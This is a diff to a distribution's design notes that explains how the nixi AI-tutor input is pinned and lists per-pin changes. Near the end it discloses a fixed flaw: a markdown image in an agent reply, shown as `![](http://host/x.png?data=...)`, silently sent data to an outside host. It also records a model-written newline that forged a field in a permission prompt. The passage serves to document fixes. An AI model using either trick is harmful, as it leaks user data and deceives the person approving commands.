@@ -1523,3 +1523,127 @@ that crosses it stops being publishable as a single file and
 release.yml would have to start splitting it. Failing here says so
 while there is still something to do about it, rather than at the
 next tag.
+
+## nixi
+
+<a id="nixi"></a>
+
+The guide that should come with nixarchy: an Omarchy overlay card (since
+nixi 0.10, #709) with a hands-on tour, a manual search grounded in the
+machine it runs on, and an AI tutor (Claude Code by default). An input rather than a vendored copy, even though both
+repositories have the same maintainer: nixi has its own release cadence,
+its own two checks and its own Home Manager module, and copying the tree
+in would mean maintaining that module twice and re-deriving the package
+on every bump. zen-browser and hypr-rdp are already here on that argument.
+
+`follows` is right here and wrong for the hyprland input in flake.nix. Nixi is QML, a
+small node bridge whose npm dependencies are a fixed-output fetch, and
+stdlib Python: nothing slow to build, and it publishes no binary cache to
+forfeit. What following buys is one node in every user's lock instead of
+two, and one nodejs and python3 in the closure rather than a second.
+
+Tracks nixi-nixarchy master (#1432). The input names no rev, so `flake.lock`
+is the pin: `nix flake update nixi` moves it, and nothing else does. Nixi's
+master only takes a change after 5 green checks, so a bump lands on a
+tested commit. This replaces the earlier rule, "pinned to a commit, never
+track a branch", which was written when nixi had one stale tag and no CI
+gate on master.
+
+Pin history, newest first (each was a commit pin before #1432):
+
+1e25cb8 is nixi-nixarchy#32: in the card, install, environment, VM,
+container and other-distro questions now lead with the nixarchy panel
+for the job. The manual excerpt added before each question used to win
+instead (a dual-boot page for "install btop"), framed as "answer
+directly from this", so #25 held on the command line but not in the
+card. Tried through the real card on razer: 6/6 lead with the right
+panel, and no unbound key is offered as working.
+
+The previous pin, 1c3fc7c, was nixi-nixarchy master after #30. Five changes a user sees:
+  - Choosing a FAQ row shows its written answer (#28). It had thrown a
+    QML TypeError since the rows were added, so the offline FAQ, one of
+    the three things that need no agent, answered nothing.
+  - Y and N answer a permission prompt (#29), but only while the message
+    box is empty, so typing cannot turn into consent; Return no longer
+    sends a steering message from behind the dialog.
+  - A permission prompt shows what is being approved (#30): the whole
+    command, or each file's -/+ lines, from the ACP tool call's rawInput
+    and diff content, as plain text that scrolls. Before, only the tool's
+    title reached the card, cut at five lines.
+  - Nixi leads with nixarchy's own panels (#25): the package manager, Dev
+    environments, MicroVMs, Podman and Distrobox, checked first with
+    nixarchy-plugin --enabled, so it never names a panel that is off or a
+    key that is not bound.
+  - The README and a new Pages site show a first session (#24); docs/
+    is excluded from the package, so this one changes no closure.
+Each was tried on a real nixarchy desktop before merge (razer, 2026-09-21).
+
+The previous pin, 6b5878a, was nixi-nixarchy#17: the missing-adapter message names the route a
+nixarchy user actually has. It used to say only "add pkgs.claude-agent-acp
+to your configuration", which works and is not what this distribution
+provides; it now names `services.nixi.agents`, says that is a Home Manager
+option, states the unfree prerequisite for Claude's adapter alone (measured:
+claude-agent-acp throws without unfree, codex-acp does not), and gives the
+sequence -- rebuild, THEN omarchy-restart-shell, because a rebuild does not
+reach a shell already running (#710).
+
+This is the runtime half of #741. The build-time half cannot exist: a
+Claude installed by mise into ~/.local/bin is recorded only in
+~/.config/omarchy/defaults/agent, which no module can read.
+
+The previous pin, 6d7a61b, was nixi-nixarchy#15: nixi's mark is sparkles rather than the pixel
+snowflake, on the bar button, the bar plugin's own description and the
+Omarchy menu entry. The bar widget drops its QML Canvas for the glyph at
+U+F0674, which is how omarchy's own bar indicators draw, so it picks up
+optical centring and theme colour from BarIconButton instead of painting
+them by hand. The menu entry stops being a generic help-circle.
+
+This is appearance only. It is a visible change on every machine that
+rebuilds, and it depends on the bar font being a Nerd Font -- already true
+of Style.font.family's default and of omarchy's own indicators.
+
+The previous pin, 1a7f9cb, was nixi-nixarchy#13: its default-agent
+fallback picks the first agent whose adapter RESOLVES rather than the
+literal name "claude". That still matters from #731 on and is carried
+forward here; see that issue for the reasoning.
+
+The previous pin, 4e6c1b5, was nixi-nixarchy#37/#43 (summon action
+"ask").
+The pin before this one, d99e335, was nixi-nixarchy#84: MenuSearch imports
+MenuModel.js from a build-time store copy of our Omarchy (#1070), which is
+why `omarchy` follows ours.
+This one is nixi-nixarchy#88 on top of #87, and it carries a fix for
+something every machine on the previous pin does. BEFORE it, the card
+FETCHED remote images named in an agent reply: a reply holding
+`![](http://host/x.png?data=...)` produced that request at GUIDE, with no
+prompt and no tool call, so none of Guide's defences engaged. Measured
+against a listener on loopback, which logged the query string intact. It is
+reported privately on nixi's repository; this pin is what carries the fix.
+An image now renders only from a local file inside nixi's own image
+directory; anything else becomes its alt text.
+The rest of what a user sees:
+- answers can carry tables, images and charts, and the chart is drawn by
+  nixi's own bridge rather than the agent, so it works at GUIDE -- where
+  the agent may not write a file at all (#86/#87)
+- the permission prompt is readable again: three options used to overlap
+  into a smear, the command was printed twice, and a one-line description
+  cost three lines of JSON (#88)
+- a permission value can no longer forge a field line -- a model-written
+  `description` holding a newline printed a second `timeout:` above the
+  real one, in the prompt someone reads before approving a command (#88)
+- desktop control through ai-mirror exists, at Mechanic and on Claude
+  only, and OFF unless `services.nixi.aiMirror.package` is set. nixarchy
+  passes no package, so this bump does not turn it on; whether it should
+  ride `programs.nixarchy.aiMirror.mcp` is #1169's open question and
+  spec/2026-09-22-773-ai-mirror-default.md's subject.
+It also carries nixi-nixarchy#36-#83:
+- adapters pin their commands and read project config (#73, #76/#78, #80, #83)
+- permission prompts: allow-always, fidelity, the trust-pending wedge (#46, #58, #65)
+- safe I/O in one module, the markdown boundary and the guide read gate (#47, #48, #64)
+- the enable card follows the display and grows with content (#49, #57, #69)
+- dead code, migrations, MotionTuner and fff removed (#36, #67, #68, #70, #81)
+- menu writes escalate safely, learned visibility, and drift fixes (#54, #59, #61, #72)
+- one ack event, a tour file-watch reload, agent settings sources (#45, #66, #71), plus a flake.lock update (#82)
+Now master at 5ae2ca4 (#1391): Mechanic edits are backed up, checked and
+undoable with /undo (#90), a learned marker counts only at a line start
+(#89), and the Qt 6.12 Color fix (#1381).
